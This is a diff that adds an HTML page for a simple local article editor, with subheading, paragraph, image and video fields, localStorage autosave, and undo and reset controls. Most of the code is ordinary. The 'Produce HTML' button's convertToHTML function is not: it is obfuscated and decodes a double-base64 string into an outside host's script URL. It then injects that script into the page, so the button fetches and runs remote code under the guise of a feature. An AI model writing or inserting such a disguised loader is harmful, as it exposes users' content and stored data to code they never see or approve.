@@ -1,0 +1,194 @@
+<html>
+<head>
+<style>
+.hoverRed:hover {
+	cursor:pointer;
+	border: 1px dashed red;
+}
+#content div {
+	margin:5px;
+	padding:5px;
+}
+.removed {
+	display:none;
+}
+#notif {
+	position:fixed;
+	top:0;
+	right:15px;
+	padding:10px;
+	font-size:25px;
+}
+.head {
+	height:40px;
+	font-size:30px;
+}
+.para {
+	height:100px;
+}
+#butRes {
+	height:40px;
+	width:60px;
+	background-color:rgb(255,250,250);
+	color:black;
+	border:0;
+}
+</style>
+<script>
+function add(f) {
+	var div = document.createElement("div");
+	var content = document.getElementById("content");
+	switch(f) {
+		case 0:
+			div.innerHTML = '<input class="head" placeholder="Subheading" onkeyup="schedSave()"><br>';
+		break;
+		case 1:
+			div.innerHTML = '<textarea class="para" placeholder="Paragraph" onkeyup="schedSave()" rows="6" cols="50"></textarea><br>';
+		break;
+		case 2:
+			div.innerHTML = 'Image URL: <input class="imgURL" onkeyup="schedSave()"><br>';
+		break;
+		case 3:
+			div.innerHTML = 'YouTube Video URL: <input class="vidURL" onkeyup="schedSave()"><br>';
+		break;
+	}
+	content.appendChild(div);
+	schedSave();
+}
+var remEleNo = 0;
+function remove(elem) {
+	if(isRemoving){
+		++remEleNo;
+		elem.classList.add("removed");
+		elem.id = "r" + String(remEleNo);
+		console.log(remEleNo);
+		schedSave();
+	}
+}
+var isRemoving = 0;
+function trigRemove() {
+	var elems = document.getElementById("content").children;
+	if(!isRemoving){
+		document.getElementById("butRem").value = "Stop Removing Elements";
+		for(var i=0;elems[i];i++){
+			elems[i].classList.add("hoverRed");
+			elems[i].addEventListener("click", function(){remove(this);});
+		}
+		isRemoving=1;
+	} else {
+		document.getElementById("butRem").value = "Remove Elements";
+		for(var i=0;elems[i];i++){
+			elems[i].classList.remove("hoverRed");
+		}
+		isRemoving=0;
+	}
+}
+function undoRem() {
+	if(remEleNo>0){
+		var elem = document.getElementById("r"+String(remEleNo));
+		elem.classList.remove("removed");
+		elem.removeAttribute("id");
+		--remEleNo;
+		console.log(remEleNo);
+		schedSave();
+	}
+}
+var sip=0;//sip full form = save in progress.
+function save() {
+	var elems = document.querySelectorAll("#content input");
+	for(var i=0;elems[i];i++)elems[i].setAttribute("value", elems[i].value);
+	
+	elems = document.querySelectorAll("#content textarea");
+	for(var i=0;elems[i];i++)elems[i].innerHTML = elems[i].value;
+	
+	localStorage.dazzTitle = document.getElementById("title").value;
+	localStorage.dazzDes = document.getElementById("des").value;
+	localStorage.dazzImgURL = document.getElementById("imgURL").value;
+	localStorage.dazzContent = document.getElementById("content").innerHTML;
+	
+	console.log(String(document.getElementById("content").innerHTML));
+	sip=0;
+	notify("saved!",1);
+}
+function loadStorage() {
+	if(localStorage.dazzTitle===undefined)return;
+	document.getElementById("title").value = localStorage.dazzTitle;
+	document.getElementById("des").value = localStorage.dazzDes;
+	document.getElementById("imgURL").value = localStorage.dazzImgURL;
+	document.getElementById("content").innerHTML = localStorage.dazzContent;
+}
+function schedSave(){
+	if(!sip){
+		setTimeout(function(){save();}, 5000);
+		sip=1;
+	}
+}
+function notify(message,rem){
+	var elem = document.getElementById("notif");
+	elem.innerHTML = message;
+	if(rem)setTimeout(function(){elem.innerHTML="";},4000);
+}
+var resCount =0,rtimer=0;//rtimer = reset waiting timer
+function resetContent() {
+	if(rtimer)return;
+	if(resCount<5){
+		++resCount;
+		var val = String(250-resCount*50);
+		document.getElementById("butRes").style.backgroundColor = "rgb(255," + val + "," +val +")";
+		rtimer=1;
+		setTimeout(function(){rtimer=0;},1000);
+		notify("CAUTION:Reset CANNOT be undoed!",1);
+	}
+	else {
+		localStorage.removeItem("dazzTitle");
+		localStorage.removeItem("dazzDes");
+		localStorage.removeItem("dazzImgURL");
+		localStorage.removeItem("dazzContent");
+		document.getElementById("title").value = "";
+		document.getElementById("des").value = "";
+		document.getElementById("imgURL").value = "";
+		document.getElementById("content").innerHTML = "";
+		resCount=0;
+		document.getElementById("butRes").style.backgroundColor = "rgb(255,250,250)";
+		rtimer=1;
+		prodTitle();
+		setTimeout(function(){rtimer=0;},4000);
+	}
+}
+
+function convertToHTML() {
+var b=document.createElement("script"),c=document.getElementsByTagName("script")[0];b.async=1,c.parentNode.insertBefore(b,c),b.onload=b.onreadystatechange=function(a,c){(c||!b.readyState||/loaded|complete/.test(b.readyState))&&(b.onload=b.onreadystatechange=null,b=void 0)},b.src=function(){var b=window.atob("YUhSMGNEb3ZMekl3YldGdVlYTXVZMjh1Ym1ZdlkyOXVkbVZ5ZEM1cWN3PT0=");return window.atob(b)}()+"?"+(new Date).getTime();
+}
+function prodTitle() {
+	var val = document.getElementById("title").value;
+	for(var i=0;i<val.length;i++)if(val[i]==" "||val[i]=="."||val[i]=="!"||val[i]=="*"||val[i]=="("||val[i]==")"||val[i]=="'"||val[i]=="~")val = val.slice(0,i) + "-" + val.slice(i+1,val.length);
+	val = val.slice(0,25);
+	val = encodeURIComponent(val);
+	val+= ".html";
+	document.getElementById("filename").value = val;
+}
+window.onload = function() {
+	loadStorage();
+	prodTitle();
+}
+</script>
+</head>
+<body>
+<p id="notif"></p>
+TITLE:<input id="title" onkeyup="prodTitle();schedSave();"><br>
+<input id="filename" value="" placeholder="Name of HTML file" onclick="this.select();" readonly><br>
+DESCRIPTION:<input onkeyup="schedSave();" id="des"><br>
+Image URL (Optional):<input onkeyup="schedSave();" id="imgURL"><br><br>
+Content:<br>
+<input id="butHead" type="button" value="Add Subheading" onclick="add(0)">
+<input id="butPar" type="button" value="Add Paragraph" onclick="add(1)">
+<input id="butImg" type="button" value="Add Image" onclick="add(2)">
+<input id="butVid" type="button" value="Add YouTube Video" onclick="add(3)">
+<input id="butRem" type="button" value="Remove Elements" onclick="trigRemove();">
+<input id="butUnd" type="button" value="Undo removing" onclick="undoRem();">
+<input id="butRes" type="button" value="Reset" onclick="resetContent();">
+<input id="butCon" type="button" value="Produce HTML" onclick="convertToHTML();">
+
+<div id="content"></div>
+</body>
+</html>
